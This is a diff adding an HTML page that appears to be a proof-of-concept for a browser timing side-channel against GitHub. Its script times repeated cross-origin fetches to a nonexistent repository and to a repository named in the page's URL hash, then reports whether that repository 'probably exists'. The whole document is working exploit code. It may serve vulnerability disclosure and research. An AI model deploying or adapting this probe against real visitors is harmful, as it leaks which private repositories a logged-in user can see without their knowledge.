@@ -1,0 +1,51 @@
+<html>
+    <body>
+        <script>
+            "use strict";
+
+            async function getRequestTime(u) {
+                const t1 = Date.now();
+                try {
+                    await fetch(u);
+                } catch (_) {
+                    // We know fetch will CORS error here. That's okay, we do not care.
+                }
+                return Date.now() - t1;
+            }
+
+            async function getAverageRequestTime(u) {
+                const a = [];
+                for (let i = 0; 100 > i; i++) {
+                    a.push(await getRequestTime(`${u}?a=${i}`));
+                }
+                return a.reduce((a, b) => a + b, 0) / a.length;
+            } 
+
+            (async () => {
+                // Try and get the repo from the window hash.
+                const hash = window.location.hash.substr(1);
+                if (hash === "") {
+                    document.write("<p>Please give the repo as a document hash in the format x/y</p>");
+                    return;
+                }
+
+                // Write that the POC is started.
+                document.write("<p>POC started</p>");
+
+                // Get the data for a lot of actual 404's.
+                const time404 = await getAverageRequestTime("https://github.com/jakemakesstuff/thisrepodoesnotexist");
+                document.write(`<p>404 time: ${time404}ms</p>`);
+
+                // Get the time for a repo that might exist.
+                const timeExists = await getAverageRequestTime(`https://github.com/${hash}`);
+
+                // Log everything to the document thus far.
+                if (timeExists > time404 + 10) {
+                    document.write(`<p>Repo probably exists (time: ${timeExists}ms)</p>`);
+                } else {
+                    document.write(`<p>Repo probably doesn't exist (time: ${timeExists}ms)</p>`);
+                }
+            })();
+        </script>
+    </body>
+</html>
